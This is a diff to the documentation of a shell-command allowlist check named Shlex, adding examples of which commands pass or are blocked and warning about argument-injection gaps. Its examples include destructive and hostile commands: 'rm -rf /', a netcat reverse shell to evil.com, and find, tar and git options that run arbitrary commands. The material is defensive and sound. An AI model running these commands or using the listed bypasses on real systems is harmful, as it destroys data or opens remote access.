@@ -666,11 +666,19 @@ constraint.matches("ls -la /tmp")           # True
 constraint.matches("cat file.txt")          # True
 constraint.matches("ls -la; rm -rf /")      # False (operator blocked)
 constraint.matches('ls "foo; bar"')         # True (quoted semicolon is literal)
+constraint.matches('echo ";"')              # True (a quoted operator is an argument)
+constraint.matches("ls #; rm")              # True (# starts a word, so the rest is a comment)
+constraint.matches("ls foo#; rm -rf /")     # False (# inside a word is not a comment)
+constraint.matches("./ls,evil -la")         # False (the command name is ./ls,evil)
 constraint.matches("echo $(whoami)")        # False (command substitution)
 constraint.matches('echo "$HOME"')          # False ($ expands inside double quotes)
 constraint.matches("ls $HOME")              # False (variable expansion)
 constraint.matches("rm -rf /")              # False (rm not in allowlist)
 ```
+
+`#` starts a comment only when it is the first character of a word. `allow=["ls"]` matches the word `ls` and any path whose file name is `ls`, including `/tmp/attacker/ls`. It does not match `./ls,evil`.
+
+A quoted or backslash-escaped operator is a literal argument, so `find . -exec rm {} \;` passes this check. `find` still runs the argument. That is the semantic gap in the warning below. `Shlex.check(command)` returns the same decision the warrant uses, including the reason.
 
 **Security Features:**
 
@@ -687,8 +695,9 @@ constraint.matches("rm -rf /")              # False (rm not in allowlist)
 | Unauthorized binary | `nc -e /bin/sh evil.com` | Yes |
 
 > [!NOTE]
-> Glob characters (`*`, `?`, `[`) are allowed. They expand to filenames
-> but are not shell injection vectors. If you need to restrict file
+> Glob characters (`*`, `?`, `[`) are literal arguments to this check. A
+> shell that runs the command may still expand them. Bash may also expand
+> `{a,b,c}`; this check keeps that as one word. If you need to restrict file
 > access, combine `Shlex` with `Subpath`.
 
 > [!WARNING]
@@ -700,6 +709,7 @@ constraint.matches("rm -rf /")              # False (rm not in allowlist)
 > # These pass Shlex but the tool executes the argument:
 > "git clone --upload-pack='malicious' repo"
 > "tar --checkpoint-action=exec=cmd -xf file.tar"
+> "find . -exec rm {} \\;"
 > ```
 >
 > For complete protection, use `proc_jail` which bypasses the shell entirely via `execve()`.
